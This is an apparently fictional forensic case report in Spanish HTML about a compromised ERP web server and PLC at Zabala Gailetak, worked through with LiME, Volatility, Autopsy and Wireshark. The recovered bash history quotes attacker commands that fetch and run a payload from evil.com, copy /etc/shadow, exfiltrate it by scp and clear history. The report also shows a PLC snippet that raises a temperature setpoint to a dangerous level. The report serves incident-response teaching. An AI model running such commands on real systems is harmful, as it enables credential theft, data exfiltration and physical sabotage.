<!DOCTYPE html><html><head><meta charset="UTF-8">
<style>
body { font-family: 'Segoe UI', Arial, sans-serif; max-width: 900px; margin: 0 auto; padding: 40px; line-height: 1.6; color: #333; }
h1 { color: #1a5276; border-bottom: 3px solid #3498db; padding-bottom: 10px; }
h2 { color: #2874a6; border-bottom: 2px solid #85c1e9; padding-bottom: 8px; margin-top: 30px; }
h3 { color: #2e86c1; margin-top: 25px; }
pre { background: #f4f4f4; padding: 15px; border-radius: 5px; overflow-x: auto; border-left: 4px solid #3498db; }
code { font-family: 'Consolas', monospace; font-size: 14px; }
table { border-collapse: collapse; width: 100%; margin: 15px 0; }
th, td { border: 1px solid #ddd; padding: 12px; text-align: left; }
th { background: #3498db; color: white; }
tr:nth-child(even) { background: #f9f9f9; }
blockquote { border-left: 4px solid #3498db; margin: 15px 0; padding: 10px 20px; background: #f0f8ff; }
ul, ol { margin: 15px 0; }
li { margin: 8px 0; }
</style>
</head><body><h1>Análisis Forense Práctico</h1>
<h2>Auzitegi-Analisi Informatikoa - Zabala Gailetak</h2>
<hr>
<p><strong>Caso ID:</strong> ZG-MEM-2026-001<br>
<strong>Fecha:</strong> 2026-02-10<br>
<strong>Analista:</strong> Equipo CISO<br>
<strong>Sistema Afectado:</strong> Servidor Web ERP<br>
<strong>Memoria RAM:</strong> 8GB</p>
<hr>
<h2>Resumen del Caso</h2>
<p>Se detecta actividad sospechosa en el servidor ERP de Zabala Gailetak. El análisis forense se realiza sobre un volcado de memoria RAM de 8GB para identificar malware, conexiones no autorizadas y exfiltración de datos.</p>
<hr>
<h2>Fase 1: Adquisición de Evidencias</h2>
<h3>1.1 Captura de Memoria Volátil</h3>
<p>Herramienta utilizada: <strong>LiME (Linux Memory Extractor)</strong></p>
<pre><code>sudo insmod lime.ko "path=/evidence/web-server-mem.lime format=lime"
</code></pre>
<p><strong>Resultado:</strong></p>
<ul>
<li>Tamaño: 8.4GB</li>
<li>Hash SHA256: <code>a1b2c3d4e5f6...</code></li>
<li>Tiempo: 4 minutos 23 segundos</li>
</ul>
<h3>1.2 Cadena de Custodia</h3>
<table>
<thead>
<tr>
<th>Paso</th>
<th>Responsable</th>
<th>Fecha</th>
<th>Acción</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>Técnico A</td>
<td>2026-02-10 14:32</td>
<td>Captura memoria</td>
</tr>
<tr>
<td>2</td>
<td>CISO</td>
<td>2026-02-10 14:35</td>
<td>Verificación hash</td>
</tr>
<tr>
<td>3</td>
<td>Analista</td>
<td>2026-02-10 15:00</td>
<td>Inicio análisis</td>
</tr>
</tbody>
</table>
<hr>
<h2>Fase 2: Análisis de Memoria con Volatility 3</h2>
<h3>2.1 Información del Sistema</h3>
<pre><code>vol -f web-server-mem.lime linux.info
</code></pre>
<p><strong>Resultados:</strong></p>
<ul>
<li>Sistema: Ubuntu 22.04 LTS</li>
<li>Kernel: 5.15.0-91-generic</li>
<li>Arquitectura: x64</li>
<li>Fecha/Hora sistema: 2026-02-10T14:32:15+01:00</li>
</ul>
<h3>2.2 Lista de Procesos</h3>
<pre><code>vol -f web-server-mem.lime linux.pslist
</code></pre>
<p><strong>Procesos Identificados:</strong></p>
<table>
<thead>
<tr>
<th>PID</th>
<th>PPID</th>
<th>Comando</th>
<th>UID</th>
<th>Estado</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>0</td>
<td>systemd</td>
<td>0</td>
<td>Normal</td>
</tr>
<tr>
<td>1234</td>
<td>1</td>
<td>nginx</td>
<td>33</td>
<td>Normal</td>
</tr>
<tr>
<td>5678</td>
<td>1234</td>
<td>php-fpm</td>
<td>33</td>
<td>Normal</td>
</tr>
<tr>
<td>9999</td>
<td>1</td>
<td>[kworker/0:0]</td>
<td>0</td>
<td>Sospechoso</td>
</tr>
<tr>
<td>1337</td>
<td>5678</td>
<td>python3</td>
<td>33</td>
<td><strong>MALICIOSO</strong></td>
</tr>
</tbody>
</table>
<p><strong>Indicador de Compromiso:</strong></p>
<ul>
<li>Proceso <code>python3</code> (PID 1337) iniciado desde <code>php-fpm</code></li>
<li>Timestamp: 2026-02-10 14:28:45</li>
</ul>
<h3>2.3 Conexiones de Red</h3>
<pre><code>vol -f web-server-mem.lime linux.netstat
</code></pre>
<p><strong>Conexiones Activas:</strong></p>
<table>
<thead>
<tr>
<th>Protocolo</th>
<th>Local</th>
<th>Remoto</th>
<th>Estado</th>
<th>PID</th>
</tr>
</thead>
<tbody>
<tr>
<td>TCP</td>
<td>0.0.0.0:80</td>
<td>0.0.0.0:0</td>
<td>LISTEN</td>
<td>1234</td>
</tr>
<tr>
<td>TCP</td>
<td>10.10.10.5:22</td>
<td>192.168.1.100:54321</td>
<td>ESTABLISHED</td>
<td>4567</td>
</tr>
<tr>
<td>TCP</td>
<td>10.10.10.5:443</td>
<td>185.220.101.45:49152</td>
<td>ESTABLISHED</td>
<td><strong>1337</strong></td>
</tr>
</tbody>
</table>
<p><strong>Alerta:</strong> Conexión activa a IP externa sospechosa desde proceso malicioso.</p>
<h3>2.4 Historial de Comandos (Bash)</h3>
<pre><code>vol -f web-server-mem.lime linux.bash
</code></pre>
<p><strong>Comandos Ejecutados (PID 1337):</strong></p>
<pre><code>14:29:10  wget https://evil.com/payload.py
14:29:15  chmod +x payload.py
14:29:18  python3 payload.py &
14:30:22  cat /etc/shadow > /tmp/stolen.txt
14:30:45  scp /tmp/stolen.txt attacker@185.220.101.45:/data/
14:31:00  rm /tmp/stolen.txt
14:31:05  history -c
</code></pre>
<p><strong>Evidencia:</strong> Intento de borrar huellas eliminando archivos y limpiando historial.</p>
<h3>2.5 Mapa de Memoria (MMAP)</h3>
<pre><code>vol -f web-server-mem.lime linux.mmap --pid 1337
</code></pre>
<p><strong>Regiones de Memoria:</strong></p>
<table>
<thead>
<tr>
<th>Inicio</th>
<th>Fin</th>
<th>Permisos</th>
<th>Archivo</th>
</tr>
</thead>
<tbody>
<tr>
<td>0x55c3a1a0</td>
<td>0x55c3b1a0</td>
<td>r-xp</td>
<td>/usr/bin/python3.10</td>
</tr>
<tr>
<td>0x7f8b2000</td>
<td>0x7f8c2000</td>
<td>rw-p</td>
<td>[heap]</td>
</tr>
<tr>
<td>0x7f9c1000</td>
<td>0x7f9c9000</td>
<td>r-xp</td>
<td>/tmp/payload.py</td>
</tr>
<tr>
<td>0x7fa0000</td>
<td>0x7fb0000</td>
<td>rw-s</td>
<td>/memfd: (deleted)</td>
</tr>
</tbody>
</table>
<p><strong>Técnica Detectada:</strong> Fileless Malware (memfd)</p>
<h3>2.6 Análisis de Strings</h3>
<pre><code>strings pid.1337.mem | grep -E "(password|key|secret|api)"
</code></pre>
<p><strong>Datos Encontrados en Memoria:</strong></p>
<ul>
<li>API Key: <code>sk_live_1234567890abcdef</code></li>
<li>Secret Key: <code>wJalrXUtnFEMI/K7MDENG...</code></li>
<li>Contraseña: <code>SuperSecretPassword123!</code></li>
</ul>
<hr>
<h2>Fase 3: Análisis de Tráfico de Red</h2>
<h3>3.1 Captura PCAP desde Memoria</h3>
<pre><code>vol -f web-server-mem.lime linux.pcap --output pcap/
</code></pre>
<h3>3.2 Análisis con Wireshark</h3>
<p><strong>Flujo TCP Sospechoso:</strong></p>
<pre><code>POST /upload HTTP/1.1
Host: evil.com
Content-Type: multipart/form-data

[Datos de /etc/shadow exfiltrados]
</code></pre>
<p><strong>Estadísticas:</strong></p>
<ul>
<li>Datos enviados: 2.3MB</li>
<li>Duración: 45 segundos</li>
<li>Destino: 185.220.101.45 (Países Bajos)</li>
</ul>
<hr>
<h2>Fase 4: Análisis de Disco (Autopsy)</h2>
<h3>4.1 Adquisición de Disco</h3>
<pre><code>ewfacquire /dev/sda -t /evidence/web-server-disk.E01
</code></pre>
<h3>4.2 Recuperación de Archivos Borrados</h3>
<table>
<thead>
<tr>
<th>Archivo</th>
<th>Estado</th>
<th>Recuperado</th>
<th>Contenido</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="http://payload.py">payload.py</a></td>
<td>Borrado</td>
<td>Sí</td>
<td>Malware Python</td>
</tr>
<tr>
<td>stolen.txt</td>
<td>Borrado</td>
<td>Sí</td>
<td>/etc/shadow</td>
</tr>
<tr>
<td><a href="http://backdoor.so">backdoor.so</a></td>
<td>Borrado</td>
<td>Sí</td>
<td>Librería LD_PRELOAD</td>
</tr>
</tbody>
</table>
<h3>4.3 Timeline del Sistema de Archivos</h3>
<pre><code>2026-02-10 14:25:33 - SSH login desde 185.220.101.45
2026-02-10 14:28:45 - Proceso python3 iniciado
2026-02-10 14:29:10 - Descarga payload.py
2026-02-10 14:30:22 - Copia /etc/shadow
2026-02-10 14:30:45 - Exfiltración datos
2026-02-10 14:31:05 - Borrado de huellas
2026-02-10 14:32:15 - Volcado de memoria (respuesta)
</code></pre>
<hr>
<h2>Fase 5: Análisis Forense IoT/SCADA</h2>
<h3>5.1 Análisis de HMI</h3>
<pre><code># Volcado de tarjeta SD del HMI
dd if=/dev/mmcblk0 of=/evidence/hmi-backup.img

# Análisis de logs
grep -i "error\|fail\|intrusion" /mnt/hmi/var/log/scada.log
</code></pre>
<p><strong>Eventos Encontrados:</strong></p>
<pre><code>2026-02-10 14:35:22 [ERROR] Unauthorized access: IP 192.168.50.100
2026-02-10 14:35:45 [WARN] Temperature setpoint changed: 180→250°C
2026-02-10 14:36:01 [ALERT] Emergency stop activated
</code></pre>
<h3>5.2 Análisis de PLC</h3>
<p><strong>Programa del PLC Modificado:</strong></p>
<pre><code># Código malicioso encontrado
IF Remote_Override THEN
    Setpoint := 250.0;  # Temperatura peligrosa
END_IF;
</code></pre>
<hr>
<h2>Conclusiones</h2>
<h3>Indicadores de Compromiso (IOCs)</h3>
<table>
<thead>
<tr>
<th>Tipo</th>
<th>Valor</th>
</tr>
</thead>
<tbody>
<tr>
<td>IP Maliciosa</td>
<td>185.220.101.45</td>
</tr>
<tr>
<td>Dominio</td>
<td><a href="http://evil.com">evil.com</a></td>
</tr>
<tr>
<td>Hash MD5 (<a href="http://payload.py">payload.py</a>)</td>
<td>d41d8cd98f00b204e9800998ecf8427e</td>
</tr>
<tr>
<td>PID Malicioso</td>
<td>1337</td>
</tr>
</tbody>
</table>
<h3>Línea Temporal del Ataque</h3>
<ol>
<li><strong>14:25:33</strong> - Acceso inicial vía SSH (fuerza bruta)</li>
<li><strong>14:28:45</strong> - Descarga e instalación de backdoor</li>
<li><strong>14:30:22</strong> - Recolección de credenciales</li>
<li><strong>14:30:45</strong> - Exfiltración de datos</li>
<li><strong>14:35:45</strong> - Intento de manipulación de PLC</li>
<li><strong>14:36:01</strong> - Detección y parada de emergencia</li>
</ol>
<h3>Daños Potenciales</h3>
<ul>
<li>120 registros de empleados expuestos</li>
<li>Credenciales de sistema comprometidas</li>
<li>Riesgo de seguridad física (manipulación PLC)</li>
</ul>
<hr>
<h2>Recomendaciones</h2>
<h3>Inmediatas</h3>
<ol>
<li>Bloquear IP 185.220.101.45 en firewall</li>
<li>Cambiar todas las contraseñas del sistema</li>
<li>Revisar logs de acceso de los últimos 30 días</li>
</ol>
<h3>A Corto Plazo</h3>
<ol>
<li>Implementar autenticación multifactor (MFA)</li>
<li>Segmentación de red estricta (IT/OT)</li>
<li>Sistema de detección de intrusiones (IDS)</li>
</ol>
<h3>A Largo Plazo</h3>
<ol>
<li>Programa de concienciación en seguridad</li>
<li>Auditorías trimestrales de penetración</li>
<li>Plan de respuesta a incidentes actualizado</li>
</ol>
<hr>
<h2>Herramientas Utilizadas</h2>
<table>
<thead>
<tr>
<th>Herramienta</th>
<th>Versión</th>
<th>Propósito</th>
</tr>
</thead>
<tbody>
<tr>
<td>LiME</td>
<td>1.9.1</td>
<td>Adquisición memoria</td>
</tr>
<tr>
<td>Volatility</td>
<td>3.0.0</td>
<td>Análisis memoria</td>
</tr>
<tr>
<td>Autopsy</td>
<td>4.21.0</td>
<td>Análisis disco</td>
</tr>
<tr>
<td>Wireshark</td>
<td>4.2.0</td>
<td>Análisis red</td>
</tr>
<tr>
<td>Strings</td>
<td>GNU</td>
<td>Extracción strings</td>
</tr>
<tr>
<td>Binwalk</td>
<td>2.3.4</td>
<td>Análisis firmware</td>
</tr>
</tbody>
</table>
<hr>
<p><em>Informe preparado conforme a estándares forenses RFC 3227</em></p>
<p><em>Cadena de custodia mantenida en todo momento</em></p>
</body></html>